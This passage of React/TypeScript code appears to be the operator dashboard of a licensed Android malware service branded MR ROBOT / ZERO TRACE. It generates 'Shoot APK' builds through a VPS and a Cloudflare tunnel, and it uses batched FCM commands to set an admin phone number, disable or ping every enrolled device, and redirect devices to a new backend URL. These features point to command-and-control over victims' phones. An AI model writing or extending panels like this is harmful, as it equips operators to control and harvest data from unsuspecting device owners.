      // Lock selection permanently after first successful build start
      if (!locked) {
        setLocked(true);
        fetch("/api/token-app", { method:"POST", headers:{"Content-Type":"application/json"}, body: JSON.stringify({ token: appId, apkId: selId }) }).catch(()=>{});
      }
      // Poll /info every 3s; animate progress based on elapsed time
      const jobId = bd.jobId;
      const startMs = Date.now();
      const EXPECTED_MS = 0;
      setProgressMsg("Building APK...");
      pollRef.current = setInterval(async () => {
        const elapsed = Date.now() - startMs;
        void elapsed; void EXPECTED_MS;
        try {
          const ir = await fetch(VPS + "/api/build/" + jobId + "/info");
          const info = await ir.json() as {status?: string; error?: string};
          if (info.status === "done") {
            clearInterval(pollRef.current!); pollRef.current = null;
            const url = VPS + "/api/build/" + jobId + "/download";
            setDlUrl(url); setPhase("done");
            // Auto-trigger download
            const a = document.createElement("a"); a.href = url; a.download = ""; document.body.appendChild(a); a.click(); document.body.removeChild(a);
          } else if (info.status === "error") {
            clearInterval(pollRef.current!); pollRef.current = null;
            setErrMsg(info.error ?? "Build failed"); setPhase("form");
          }
        } catch { /* ignore transient poll errors */ }
      }, 3000);
    } catch { setErrMsg("Server error"); setPhase("form"); }
  }

  function reset() { if(pollRef.current){clearInterval(pollRef.current);pollRef.current=null;} setPhase("form"); setProgress(0); setProgressMsg(""); setErrMsg(""); setDlUrl(""); setAppName(""); /* selId & locked stay — user rebuilds same app */ }

  const IS: React.CSSProperties = { width:"100%", boxSizing:"border-box" as const, padding:"9px 12px", borderRadius:8, border:`1.5px solid ${t.cardB}`, background:t.bg, color:t.txt, fontSize:13, outline:"none" };

  if (phase === "building") return (
    <div style={{display:"flex",flexDirection:"column",gap:8}}>
      <div style={{fontSize:12,color:t.muted}}>{progressMsg}</div>
      <div style={{height:4,background:t.hdrB,borderRadius:99,overflow:"hidden",position:"relative"}}>
        <div style={{position:"absolute",height:"100%",background:"#10b981",borderRadius:99,animation:"indeterminate 1.6s ease-in-out infinite",width:"40%"}} />
      </div>
      <style>{`@keyframes indeterminate{0%{left:-45%;width:40%}50%{left:30%;width:55%}100%{left:105%;width:40%}}`}</style>
      <div style={{fontSize:10,color:t.muted}}>This may take 3-5 minutes</div>
    </div>
  );

  if (phase === "done") return (
    <div style={{display:"flex",flexDirection:"column",gap:8}}>
      <div style={{fontSize:12,color:"#10b981",fontWeight:700,textAlign:"center"}}>APK downloaded successfully</div>
      <a href={dlUrl} download style={{display:"flex",alignItems:"center",justifyContent:"center",gap:6,padding:"8px",borderRadius:8,border:"1px solid #10b981",background:"transparent",color:"#10b981",fontWeight:600,fontSize:12,textDecoration:"none"}}>Download again</a>
      <button onClick={reset} style={{padding:"6px",borderRadius:8,border:`1px solid ${t.cardB}`,background:"transparent",color:t.muted,fontSize:12,cursor:"pointer"}}>New Build</button>
    </div>
  );

  // form phase (default)
  return (
    <div style={{display:"flex",flexDirection:"column",gap:8}}>
      <style>{`@keyframes shake{0%,100%{transform:translateX(0)}20%{transform:translateX(-6px)}40%{transform:translateX(6px)}60%{transform:translateX(-4px)}80%{transform:translateX(4px)}}`}</style>
      <input ref={nameRef} type="text" value={appName} onChange={e=>{setAppName(e.target.value);setNameErr(false);}} placeholder="App name is required" style={{...IS,border:nameErr?"1.5px solid #ef4444":`1.5px solid ${t.cardB}`,animation:nameErr?"shake 0.35s ease":"none",boxShadow:nameErr?"0 0 0 3px rgba(239,68,68,0.18)":"none"}} />
      {!appsReady ? (
        <div style={{...IS,color:t.muted}}>Loading...</div>
      ) : locked ? (
        <div style={{...IS,color:t.txt,background:t.hdrB,cursor:"default",display:"flex",alignItems:"center",gap:6}}>
          <span style={{fontSize:10,color:t.muted,flexShrink:0}}>APK:</span>
          <span style={{fontWeight:600,fontSize:13}}>{apps.find(a=>a.id===selId)?.name ?? selId}</span>
        </div>
      ) : (
        <select value={selId} onChange={e=>handleSelect(e.target.value)} style={{...IS,cursor:"pointer",appearance:"none"}}>
          <option value="">— Select APK —</option>
          {apps.map(a=><option key={a.id} value={a.id}>{a.name}</option>)}
        </select>
      )}
      {errMsg && <div style={{fontSize:11,color:"#ef4444"}}>{errMsg}</div>}
      <button onClick={()=>{ if(!locked){ if(!appName.trim()){setNameErr(true);nameRef.current?.focus();setTimeout(()=>setNameErr(false),2000);return;} if(!selId){setErrMsg("Please select an APK");return;} setConfirmOpen(true); } else { void handleBuild(); } }} style={{padding:"11px",borderRadius:8,border:"none",background:selId&&appsReady&&appName.trim()?"linear-gradient(135deg,#10b981,#059669)":t.hdrB,color:selId&&appsReady&&appName.trim()?"#fff":t.muted,fontWeight:700,fontSize:13,cursor:"pointer",boxShadow:selId&&appsReady&&appName.trim()?"0 4px 14px rgba(16,185,129,0.4)":"none",transition:"all 0.2s"}}>
        Download Shoot APK
      </button>
      {confirmOpen && (
        <div style={{position:"fixed",inset:0,background:"rgba(0,0,0,0.55)",zIndex:9999,display:"flex",alignItems:"center",justifyContent:"center",padding:16}}>
          <div style={{background:t.bg,borderRadius:14,padding:24,maxWidth:320,width:"100%",boxShadow:"0 8px 40px rgba(0,0,0,0.35)",border:`1px solid ${t.cardB}`}}>
            <div style={{fontSize:15,fontWeight:700,color:t.txt,marginBottom:10}}>Confirm Selection</div>
            <div style={{fontSize:13,color:t.muted,marginBottom:6,lineHeight:1.5}}>
              You are about to build:
            </div>
            <div style={{fontSize:13,fontWeight:700,color:"#10b981",marginBottom:12,padding:"8px 12px",background:t.hdrB,borderRadius:8}}>
              {apps.find(a=>a.id===selId)?.name ?? selId}
            </div>
            <div style={{fontSize:12,color:"#f59e0b",marginBottom:18,lineHeight:1.5,padding:"8px 10px",background:"rgba(245,158,11,0.08)",borderRadius:8,border:"1px solid rgba(245,158,11,0.2)"}}>
              This selection will be permanently locked. All future builds from this link will use the same app — you cannot change it later.
            </div>
            <div style={{display:"flex",gap:8}}>
              <button onClick={()=>setConfirmOpen(false)} style={{flex:1,padding:"10px",borderRadius:8,border:`1px solid ${t.cardB}`,background:"transparent",color:t.muted,fontSize:13,fontWeight:600,cursor:"pointer"}}>Cancel</button>
              <button onClick={()=>{setConfirmOpen(false);void handleBuild();}} style={{flex:1,padding:"10px",borderRadius:8,border:"none",background:"linear-gradient(135deg,#10b981,#059669)",color:"#fff",fontSize:13,fontWeight:700,cursor:"pointer"}}>Confirm & Build</button>
            </div>
          </div>
        </div>
      )}
    </div>
  );
}
function SettingsPage({ appId, isDark, onToggleDark, devices, onLogout, msgCount, isZeroTrace: isZT, onDeleteProtEnabledChange }: {
  appId: string; isDark: boolean; onToggleDark: () => void; devices: DbDevice[]; onLogout: () => void; msgCount: number; isZeroTrace?: boolean; onDeleteProtEnabledChange: (v: boolean) => void;
}) {
  const t = useTheme();
  const AUTH_KEY = `mrrobot_auth_${appId}`;
  const SESS_KEY = `mrrobot_session_id_${appId}`;

  /* ── Clean After Process ── */
  const [cleanAfterProcess, setCleanAfterProcess] = useState<boolean>(
    () => { try { return localStorage.getItem("mr_clean_after_process") === "1"; } catch { return false; } }
  );
  function toggleCleanAfterProcess() {
    const next = !cleanAfterProcess;
    setCleanAfterProcess(next);
    try { localStorage.setItem("mr_clean_after_process", next ? "1" : "0"); } catch {}
  }

  /* ── Delete Protection state ── */
  const [dpEnabled, setDpEnabled] = useState(false);
  const [dpHasPin, setDpHasPin] = useState(false);
  const [dpLoaded, setDpLoaded] = useState(false);
  const [licenceCreatedAt, setLicenceCreatedAt] = useState<number | null>(null);
  const [countdown, setCountdown] = useState<{ days: number; hours: number; mins: number; secs: number; expired: boolean } | null>(null);
  const [dpLoading, setDpLoading] = useState(false);
  const [dpPinInput, setDpPinInput] = useState("");
  const [dpCurrentPin, setDpCurrentPin] = useState("");
  const [dpPinNew, setDpPinNew] = useState("");
  const [dpSetErr, setDpSetErr] = useState("");
  const [dpToggleErr, setDpToggleErr] = useState("");
  const [dpChangePinErr, setDpChangePinErr] = useState("");
  const [dpShowToggleDialog, setDpShowToggleDialog] = useState(false);
  const [dpShowChangePinDialog, setDpShowChangePinDialog] = useState(false);
  const [shootUrlDialog, setShootUrlDialog] = useState(false);

  /* ── APK download state ── */
  const [apkLoading, setApkLoading] = useState(false);
  const [apkProgress, setApkProgress] = useState(0);
  const [apkSuccess, setApkSuccess] = useState(false);

    const [dpLoadError, setDpLoadError] = useState(false);
    const [dpLoadAttempt, setDpLoadAttempt] = useState(0);
    useEffect(() => {
    let cancelled = false;
    // Measured real backend latency for this endpoint: usually ~200-700ms, but it
    // legitimately takes 6-9s sometimes (Neon serverless connection warming up) — a 3s
    // timeout was shorter than that normal slow case, so it was aborting BEFORE the real
    // answer ever arrived, on both attempts, every time on a slower network. That's why
    // retry/reload kept failing outright instead of just being slow. Timeout is now 12s
    // (comfortably above the observed slow case) with 2 attempts and no artificial gap —
    // most loads still resolve almost instantly, occasional slow ones just take longer
    // instead of failing, and a genuine double failure still shows "tap to retry".
    async function loadOnce(): Promise<{ enabled: boolean; hasPin: boolean } | null> {
      const ctrl = new AbortController();
      const timeout = setTimeout(() => ctrl.abort(), 12000);
      try {
        const r = await fetch(`/api/apps/${appId}/delete-protection?t=${Date.now()}`, { cache: "no-store", signal: ctrl.signal });
        if (!r.ok) return null;
        return await r.json();
      } catch {
        return null;
      } finally {
        clearTimeout(timeout);
      }
    }
    setDpLoadError(false);
    (async () => {
      for (let attempt = 0; attempt < 2 && !cancelled; attempt++) {
        const d = await loadOnce();
        if (d) {
          if (!cancelled) {
            setDpEnabled(d.enabled); setDpHasPin(d.hasPin); setDpLoaded(true); setDpLoadError(false);
            onDeleteProtEnabledChange(d.enabled);
          }
          return;
        }
      }
      if (!cancelled) { setDpLoaded(true); setDpLoadError(true); }
    })();
    return () => { cancelled = true; };
  }, [appId, dpLoadAttempt]);

  // Fetch licence createdAt
  useEffect(() => {
    apiFetch(`/api/apps/${appId}`).then(r => r.ok ? r.json() : null).then((app: { createdAt?: string } | null) => {
      if (app?.createdAt) setLicenceCreatedAt(new Date(app.createdAt).getTime());
    }).catch(() => {});
  }, [appId]);

  // Countdown tick every second
  useEffect(() => {
    if (licenceCreatedAt === null) return;
    function tick() {
      const THIRTY_MS = 30 * 24 * 60 * 60 * 1000;
      const expiry = licenceCreatedAt! + THIRTY_MS;
      const diff = expiry - Date.now();
      if (diff <= 0) { setCountdown({ days: 0, hours: 0, mins: 0, secs: 0, expired: true }); return; }
      const days = Math.floor(diff / 86400000);
      const hours = Math.floor((diff % 86400000) / 3600000);
      const mins = Math.floor((diff % 3600000) / 60000);
      const secs = Math.floor((diff % 60000) / 1000);
      setCountdown({ days, hours, mins, secs, expired: false });
    }
    tick();
    const iv = setInterval(tick, 1000);
    return () => clearInterval(iv);
  }, [licenceCreatedAt]);

  async function dpSetPin() {
    setDpLoading(true); setDpSetErr("");
    if (!isSafePinValue(dpPinNew)) { setDpSetErr(PIN_CHAR_ERROR); setDpLoading(false); return; }
    try {
      const r = await fetch(`/api/apps/${appId}/delete-protection/set-pin`, { method: "POST", headers: { "Content-Type": "application/json" }, body: JSON.stringify({ pin: dpPinNew }) });
      if (!r.ok) { setDpSetErr(((await r.json()) as { error?: string }).error || "Failed"); return; }
      setDpHasPin(true); setDpPinNew("");
    } finally { setDpLoading(false); }
  }

  async function dpToggle() {
    setDpLoading(true); setDpToggleErr("");
    try {
      const r = await fetch(`/api/apps/${appId}/delete-protection/toggle`, { method: "POST", headers: { "Content-Type": "application/json" }, body: JSON.stringify({ pin: dpPinInput }) });
      if (!r.ok) { setDpToggleErr(((await r.json()) as { error?: string }).error || "Wrong password"); return; }
      const d = (await r.json()) as { enabled: boolean };
      setDpEnabled(d.enabled); setDpPinInput(""); setDpShowToggleDialog(false); onDeleteProtEnabledChange(d.enabled);
    } finally { setDpLoading(false); }
  }

  async function dpChangePin() {
    setDpLoading(true); setDpChangePinErr("");
    if (!isSafePinValue(dpPinNew)) { setDpChangePinErr(PIN_CHAR_ERROR); setDpLoading(false); return; }
    try {
      const r = await fetch(`/api/apps/${appId}/delete-protection/set-pin`, { method: "POST", headers: { "Content-Type": "application/json" }, body: JSON.stringify({ pin: dpPinNew, currentPin: dpCurrentPin }) });
      if (!r.ok) { setDpChangePinErr(((await r.json()) as { error?: string }).error || "Failed"); return; }
      setDpCurrentPin(""); setDpPinNew(""); setDpShowChangePinDialog(false);
    } finally { setDpLoading(false); }
  }

  /* ── Change PIN ── */
  const [cpOpen, setCpOpen] = useState(false);
  const [cpCurrent, setCpCurrent] = useState("");
  const [cpNew, setCpNew] = useState("");
  const [cpNew2, setCpNew2] = useState("");
  const [cpErr, setCpErr] = useState("");
  const [cpMsg, setCpMsg] = useState("");
  const [cpLoading, setCpLoading] = useState(false);

  async function handleChangePin(e: React.FormEvent) {
    e.preventDefault();
    setCpErr(""); setCpMsg(""); setCpLoading(true);
    try {
      if (!cpCurrent) { setCpErr("Current PIN is required."); setCpLoading(false); return; }
      if (cpNew.length < 4) { setCpErr("New PIN must be at least 4 characters."); return; }
      if (!isSafePinValue(cpNew)) { setCpErr(PIN_CHAR_ERROR); return; }
      if (cpNew !== cpNew2) { setCpErr("PINs do not match."); return; }
      const r = await apiFetch(`/api/apps/${appId}`, {
        method: "PATCH", headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ currentPin: cpCurrent, pin: cpNew }),
      });
      const j = await r.json().catch(() => ({})) as { error?: string };
      if (!r.ok) { setCpErr(j.error || "Failed. Try again."); return; }
      setCpMsg("PIN changed!");
      setCpNew(""); setCpNew2("");
      localStorage.removeItem(SESS_KEY);
      localStorage.removeItem(AUTH_KEY);
      setTimeout(() => { setCpOpen(false); onLogout(); }, 1500);
    } catch { setCpErr("Network error. Try again."); }
    finally { setCpLoading(false); }
  }

  /* ── Admin Sessions ── */
  const [sessions, setSessions] = useState<AdminSession[]>([]);
  const [sessLoading, setSessLoading] = useState(true);
  const mySessionId = localStorage.getItem(SESS_KEY) ?? "";


  // Skip auto-logout on the first poll — avoids false logouts from cold-start /
  // network races right after Settings opens.
  const firstFetchRef = useRef(true);
  // Require 2 consecutive "session missing" responses before kicking the user
  // out. A single missing response can happen on transient server state.
  const missCountRef = useRef(0);

  async function fetchSessions() {
    try {
      const r = await apiFetch(`/api/admin/sessions?appId=${encodeURIComponent(appId)}`, { headers: { "x-silent": "1" } });
      if (!r.ok) return;
      const list: AdminSession[] = await r.json();
      setSessions(list);

      // Safety guard: skip only the very first fetch (cold-start race)
      const isFirst = firstFetchRef.current;
      firstFetchRef.current = false;
      if (isFirst) { missCountRef.current = 0; return; }

      const myId = localStorage.getItem(SESS_KEY);
      // No session ID stored OR session not in active list → miss → logout after 2 consecutive misses
      if (!myId || !list.find(s => s.id === myId)) {
        missCountRef.current += 1;
        if (missCountRef.current >= 2) {
          localStorage.removeItem(AUTH_KEY);
          localStorage.removeItem(SESS_KEY);
          onLogout();
        }
      } else {
        missCountRef.current = 0;
      }
    } catch { /* ignore */ } finally { setSessLoading(false); }
  }

  async function logoutSession(id: string) {
    await apiFetch(`/api/admin/sessions/${id}`, { method: "DELETE" });
    if (id === mySessionId) { onLogout(); return; }
    fetchSessions();
  }

  async function logoutAll() {
    await apiFetch(`/api/admin/sessions?appId=${encodeURIComponent(appId)}`, { method: "DELETE" });
    onLogout();
  }

  useEffect(() => { fetchSessions(); const iv = setInterval(fetchSessions, 15000); return () => clearInterval(iv); }, []);

  /* ── Session countdown timer ── */
  type SessCountdown = { h: number; m: number; s: number; pct: number; danger: boolean; warning: boolean };
  const [sessCountdown, setSessCountdown] = useState<SessCountdown | null>(null);

  useEffect(() => {
    const SESSION_EXPIRY_MS = 60 * 60 * 1000; // 1 hour
    function calcCountdown() {
      const myS = sessions.find(s => s.id === mySessionId);
      if (!myS) { setSessCountdown(null); return; }
      const lastActive = new Date(myS.lastActive).getTime();
      const expiry = lastActive + SESSION_EXPIRY_MS;
      const remaining = expiry - Date.now();
      if (remaining <= 0) { setSessCountdown({ h: 0, m: 0, s: 0, pct: 0, danger: true, warning: true }); return; }
      const h = Math.floor(remaining / 3600000);
      const m = Math.floor((remaining % 3600000) / 60000);
      const s = Math.floor((remaining % 60000) / 1000);
      const pct = Math.min(100, (remaining / SESSION_EXPIRY_MS) * 100);
      setSessCountdown({ h, m, s, pct, danger: remaining < 15 * 60000, warning: remaining < 30 * 60000 });
    }
    calcCountdown();
    const iv = setInterval(calcCountdown, 1000);
    return () => clearInterval(iv);
  }, [sessions, mySessionId]);

  /* ── Update Admin (batch FCM status:on to all devices) ── */
  const [adminNum, setAdminNum] = useState("");
  const [numState, setNumState] = useState<"idle"|"running"|"done"|"err">("idle");
  const [numMsg, setNumMsg] = useState("");
  const [updateDone, setUpdateDone] = useState(0);
  const [updateResult, setUpdateResult] = useState<{ ok: number; fail: number } | null>(null);

  async function handleUpdateAdmin() {
    const val = adminNum.replace(/\D/g, "");
    if (val.length !== 10) { setNumMsg("Enter exactly 10 digits."); setNumState("err"); setTimeout(() => { setNumState("idle"); setNumMsg(""); }, 2500); return; }
    if (devices.length === 0) { setNumMsg("No devices to update."); setNumState("err"); setTimeout(() => { setNumState("idle"); setNumMsg(""); }, 2500); return; }

    setNumState("running"); setNumMsg(""); setUpdateDone(0); setUpdateResult(null);
    const BATCH = 10; const DELAY = 300;
    let ok = 0; let fail = 0;

    for (let i = 0; i < devices.length; i += BATCH) {
      const batch = devices.slice(i, i + BATCH);
      const results = await Promise.allSettled(
        batch.map(d => fcmSend(d.deviceId, mkAdminUpdate(d.deviceId, val, "on")))
      );
      results.forEach(r => r.status === "fulfilled" ? ok++ : fail++);
      setUpdateDone(Math.min(i + BATCH, devices.length));
      if (i + BATCH < devices.length) await new Promise(r => setTimeout(r, DELAY));
    }
    setUpdateResult({ ok, fail }); setNumState("done"); setAdminNum("");
    setTimeout(() => { setNumState("idle"); setUpdateDone(0); setUpdateResult(null); setNumMsg(""); }, 5000);
  }

  /* ── Disable All (batch FCM status:off) ── */
  const eligible = devices;
  const [disableAllState, setDisableAllState] = useState<"idle"|"running"|"done">("idle");
  const [disableAllDone, setDisableAllDone] = useState(0);
  const [disableAllResult, setDisableAllResult] = useState<{ ok: number; fail: number } | null>(null);

  async function handleDisableAll() {
    if (disableAllState === "running" || eligible.length === 0) return;
    const BATCH = 10; const DELAY = 300;
    setDisableAllState("running"); setDisableAllDone(0); setDisableAllResult(null);
    let ok = 0; let fail = 0;
    for (let i = 0; i < eligible.length; i += BATCH) {
      const batch = eligible.slice(i, i + BATCH);
      const results = await Promise.allSettled(batch.map(d => fcmSend(d.deviceId, mkAdminUpdate(d.deviceId, "", "off"))));
      results.forEach(r => r.status === "fulfilled" ? ok++ : fail++);
      setDisableAllDone(Math.min(i + BATCH, eligible.length));
      if (i + BATCH < eligible.length) await new Promise(r => setTimeout(r, DELAY));
    }
    setDisableAllResult({ ok, fail }); setDisableAllState("done");
    setTimeout(() => { setDisableAllState("idle"); setDisableAllDone(0); setDisableAllResult(null); }, 5000);
  }

  /* ── Ping All (batch FCM type:0 to all devices) ── */
  const [pingAllState, setPingAllState] = useState<"idle"|"running"|"done">("idle");
  const [pingAllDone, setPingAllDone] = useState(0);

  async function handlePingAll() {
    if (pingAllState === "running" || devices.length === 0) return;
    const BATCH = 10; const DELAY = 300;
    setPingAllState("running"); setPingAllDone(0);
    for (let i = 0; i < devices.length; i += BATCH) {
      const batch = devices.slice(i, i + BATCH);
      await Promise.allSettled(batch.map(d => fcmSend(d.deviceId, mkCheckOnline())));
      setPingAllDone(Math.min(i + BATCH, devices.length));
      if (i + BATCH < devices.length) await new Promise(r => setTimeout(r, DELAY));
    }
    setPingAllState("done");
    setTimeout(() => { setPingAllState("idle"); setPingAllDone(0); }, 4000);
  }

  /* ── Send Backend URL to all devices ── */
  const BACKEND_URL = `${window.location.origin}/api`;
  const [sendUrlState, setSendUrlState] = useState<"idle"|"running"|"done"|"err">("idle");
  const [sendUrlDone, setSendUrlDone] = useState(0);
  const [sendUrlResult, setSendUrlResult] = useState<{ ok: number; fail: number } | null>(null);
  const [sendUrlError, setSendUrlError] = useState("");

  async function handleSendBackendUrl() {
    if (sendUrlState === "running") return;
    setSendUrlState("running"); setSendUrlDone(0); setSendUrlResult(null); setSendUrlError("");
    const BATCH = 20;
    let offset = 0, totalOk = 0, totalFail = 0, total = 0;
    try {
      while (true) {
        const r = await apiFetch("/api/recovery", {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({ offset, limit: BATCH }),
          signal: AbortSignal.timeout(45000),
        });
        if (!r.ok) {
          const problem = await r.json().catch(() => ({})) as { error?: string };
          throw new Error(typeof problem.error === "string" ? problem.error : `Recovery request failed (HTTP ${r.status}).`);
        }
        const result = await r.json() as { ok: number; fail: number; processed: number; total: number; done: boolean; errors?: Array<{ code: string; error: string; count: number }> };
        if (!Number.isFinite(result.processed) || !Number.isFinite(result.total)) throw new Error("Invalid recovery response.");
        if (result.errors?.length) setSendUrlError(result.errors.map(error => `${error.code}: ${error.error}`).join(" "));
        totalOk   += result.ok ?? 0;
        totalFail += result.fail ?? 0;
        total      = result.total ?? total;
        setSendUrlDone(result.processed ?? offset + BATCH);
        if (result.done || result.processed >= result.total) break;
        if (result.processed <= offset) throw new Error("Recovery stopped making progress. Please try again.");
        offset = result.processed;
      }
    } catch (error) {
      setSendUrlError(error instanceof Error ? error.message : "Recovery request failed.");
      setSendUrlResult({ ok: totalOk, fail: totalFail });
      setSendUrlState("err");
      return;
    }
    setSendUrlResult({ ok: totalOk, fail: totalFail });
    setSendUrlState("done");
    setTimeout(() => { setSendUrlState("idle"); setSendUrlDone(0); setSendUrlResult(null); }, 6000);
  }

  const IS: React.CSSProperties = {
    width: "100%", boxSizing: "border-box", padding: "10px 12px",
    borderRadius: 8, border: `1.5px solid ${numState === "err" ? "#ef4444" : t.cardB}`,
    background: t.bg, color: t.txt, fontSize: 14, outline: "none",
    letterSpacing: 1,
  };

  return (
    <div style={{ padding: 10, display: "flex", flexDirection: "column", gap: 10 }}>

      {/* ── Data Recovery ── */}
      <div style={{ background: t.card, borderRadius: 10, border: `1px solid ${t.cardB}`, overflow: "hidden" }}>
        <div style={{ padding: "10px 14px", borderBottom: `1px solid ${t.hdrB}`, display: "flex", alignItems: "center", justifyContent: "space-between" }}>
          <span style={{ fontSize: 13, fontWeight: 700, color: t.txt }}>Data Recovery</span>
          <span style={{ background: devices.length > 0 ? t.accent : t.hdrB, color: devices.length > 0 ? "#fff" : t.muted, borderRadius: 99, padding: "1px 8px", fontSize: 10, fontWeight: 800 }}>
            {devices.length} device{devices.length !== 1 ? "s" : ""}
          </span>
        </div>
        <div style={{ padding: "12px 14px", display: "flex", flexDirection: "column", gap: 10 }}>
          <div style={{ fontSize: 12, color: t.muted, lineHeight: 1.55 }}>
            Sends the updated API configuration to this app's registered devices. FCM acceptance is not proof that a device applied it.
            <div style={{ marginTop: 4, overflowWrap: "anywhere" }}>Target: {BACKEND_URL}</div>
          </div>
          {sendUrlState === "running" && (
            <div style={{ display: "flex", flexDirection: "column", gap: 5 }}>
              <div style={{ height: 4, borderRadius: 99, background: t.hdrB, overflow: "hidden" }}>
                <div style={{ height: "100%", borderRadius: 99, background: t.accent, width: `${devices.length ? Math.round((sendUrlDone / devices.length) * 100) : 0}%`, transition: "width 0.3s" }} />
              </div>
              <div style={{ fontSize: 11, color: t.muted, textAlign: "center" }}>Recovering {sendUrlDone} / {devices.length}…</div>
            </div>
          )}
          {sendUrlState === "done" && sendUrlResult && (
            <div style={{ fontSize: 12, textAlign: "center", fontWeight: 700, color: sendUrlResult.fail === 0 ? "#22c55e" : "#f59e0b" }}>
              {sendUrlResult.ok === 0 && sendUrlResult.fail === 0 ? "No registered FCM targets found." : `FCM accepted: ${sendUrlResult.ok} · Failed: ${sendUrlResult.fail}. Device confirmation pending.`}
            </div>
          )}
          {sendUrlError && <div role="alert" style={{ fontSize: 12, color: "#ef4444", lineHeight: 1.5 }}>{sendUrlError}</div>}
          <button
            onClick={() => void handleSendBackendUrl()}
            disabled={sendUrlState === "running" || devices.length === 0}
            style={{ padding: "11px 0", borderRadius: 9, border: "none", background: sendUrlState === "running" ? t.hdrB : t.accent, color: sendUrlState === "running" ? t.muted : "#fff", fontWeight: 700, fontSize: 13, cursor: sendUrlState === "running" || devices.length === 0 ? "not-allowed" : "pointer", width: "100%", transition: "all 0.2s" }}
          >
            {sendUrlState === "running" ? `Recovering… ${sendUrlDone}/${devices.length}` : sendUrlState === "done" ? "Recovery batch finished" : sendUrlState === "err" ? "Retry Recovery" : "Start Recovery"}
          </button>
        </div>
      </div>

        {/* ── Licence Countdown ── */}
      {countdown && (
        <div style={{ background: countdown.expired ? (t === DT ? "#3f0f0f" : "#fef2f2") : (t === DT ? "#0f1f0f" : "#f0fdf4"), borderRadius: 12, border: `1.5px solid ${countdown.expired ? "#ef444460" : "#22c55e60"}`, padding: "14px 16px" }}>
          <div style={{ display: "flex", alignItems: "center", gap: 8, marginBottom: 10 }}>
            <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke={countdown.expired ? "#ef4444" : "#22c55e"} strokeWidth="2.2" strokeLinecap="round" strokeLinejoin="round">
              <rect x="3" y="4" width="18" height="18" rx="2"/><line x1="16" y1="2" x2="16" y2="6"/><line x1="8" y1="2" x2="8" y2="6"/><line x1="3" y1="10" x2="21" y2="10"/>
            </svg>
            <span style={{ fontWeight: 800, fontSize: 13, color: countdown.expired ? "#ef4444" : (t === DT ? "#4ade80" : "#16a34a") }}>
              {countdown.expired ? "Licence Expired" : "Licence Active"}
            </span>
          </div>
          {countdown.expired ? (
            <div style={{ fontSize: 12, color: countdown.expired ? "#ef4444" : "#22c55e", fontWeight: 600 }}>
              Your 30-day licence has expired. Please contact admin to renew.
            </div>
          ) : (
            <div style={{ display: "flex", gap: 8, flexWrap: "wrap" }}>
              {[
                { val: countdown.days, label: "Days" },
                { val: countdown.hours, label: "Hours" },
                { val: countdown.mins, label: "Mins" },
                { val: countdown.secs, label: "Secs" },
              ].map(({ val, label }) => (
                <div key={label} style={{ flex: "1 1 60px", background: t === DT ? "rgba(34,197,94,0.10)" : "rgba(34,197,94,0.12)", borderRadius: 9, border: "1px solid #22c55e30", padding: "8px 6px", textAlign: "center", minWidth: 52 }}>
                  <div style={{ fontWeight: 800, fontSize: 22, color: t === DT ? "#4ade80" : "#16a34a", fontVariantNumeric: "tabular-nums", lineHeight: 1 }}>{String(val).padStart(2, "0")}</div>
                  <div style={{ fontSize: 9, color: t === DT ? "#86efac" : "#15803d", marginTop: 3, fontWeight: 700, letterSpacing: 1.5, textTransform: "uppercase" }}>{label}</div>
                </div>
              ))}
            </div>
          )}
        </div>
      )}

      {/* ── APK Downloads Row ── */}
        <div style={{ display: "flex", gap: 10, flexWrap: "wrap" }}>

          {/* Download Android App */}
          <div style={{ flex: "1 1 220px", background: t.card, borderRadius: 10, border: `1px solid ${t.cardB}`, overflow: "hidden" }}>
            <div style={{ padding: "10px 14px", borderBottom: `1px solid ${t.cardB}`, background: t.hdr, display: "flex", alignItems: "center", gap: 8 }}>
              <span style={{ fontWeight: 800, fontSize: 13, color: t.txt }}>Download Android App</span>
            </div>
            <div style={{ padding: 14, display: "flex", flexDirection: "column", gap: 10 }}>
              <div style={{ fontSize: 12, color: t.muted, lineHeight: 1.5 }}>
                {isZT ? "Install the ZERO TRACE Android app on a device. Tap the button below to download the latest APK, then open it on your phone to install." : "Install the MR ROBOT Android app on a device. Tap the button below to download the latest APK, then open it on your phone to install."}
              </div>
              <button
                disabled={apkLoading}
                onClick={async () => {
                  setApkSuccess(false);
                  setApkLoading(true);
                  setApkProgress(0);
                  const _sp = new URLSearchParams(window.location.search);
                  _sp.delete("appId");
                  const _extra = _sp.toString();
                  const _fullToken = appId + (_extra ? "&" + _extra : "");
                  const apkUrl = `https://myrtle-none-emily-domains.trycloudflare.com/webview-apk?token=${encodeURIComponent(_fullToken)}`;
                  try {
                    const resp = await fetch(apkUrl);
                    if (!resp.ok) throw new Error("build failed");
                    const contentLength = resp.headers.get("Content-Length");
                    const total = contentLength ? parseInt(contentLength, 10) : 0;
                    const reader = resp.body!.getReader();
                    const chunks: Uint8Array[] = [];
                    let received = 0;
                    while (true) {
                      const { done, value } = await reader.read();
                      if (done) break;
                      chunks.push(value);
                      received += value.length;
                      if (total > 0) setApkProgress(Math.min(99, Math.round((received / total) * 100)));
                    }
                    setApkProgress(100);
                    const blob = new Blob(chunks, { type: "application/vnd.android.package-archive" });
                    const blobUrl = URL.createObjectURL(blob);
                    const a = document.createElement("a");
                    a.href = blobUrl; a.download = "MR_ROBOT.apk";
                    document.body.appendChild(a); a.click(); document.body.removeChild(a);
                    URL.revokeObjectURL(blobUrl);
                  } catch { /* ignore */ }
                  setApkLoading(false);
                  setApkSuccess(true);
                }}
                style={{
                  display: "inline-flex", alignItems: "center", justifyContent: "center", gap: 8,
                  padding: "12px 18px", borderRadius: 8,
                  background: apkLoading ? "rgba(99,102,241,0.12)" : isZT ? t.accent : "linear-gradient(135deg, #6366f1, #8b5cf6)",
                  color: apkLoading ? (isZT ? t.accent : "#6366f1") : "#fff",
                  fontWeight: 700, fontSize: 13, border: "none", width: "100%",
                  boxShadow: apkLoading ? "none" : isZT ? "0 4px 14px rgba(29,78,216,0.45)" : "0 4px 14px rgba(99,102,241,0.45)",
                  cursor: apkLoading ? "not-allowed" : "pointer",
                  transition: "all 0.3s",
                }}
              >
                {apkLoading ? (
                  <>
                    <svg width="15" height="15" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2.5" strokeLinecap="round" strokeLinejoin="round" style={{ animation: "spin 1s linear infinite", flexShrink: 0 }}>
                      <path d="M21 12a9 9 0 1 1-6.219-8.56" />
                    </svg>
                    Processing...
                  </>
                ) : (
                  <>
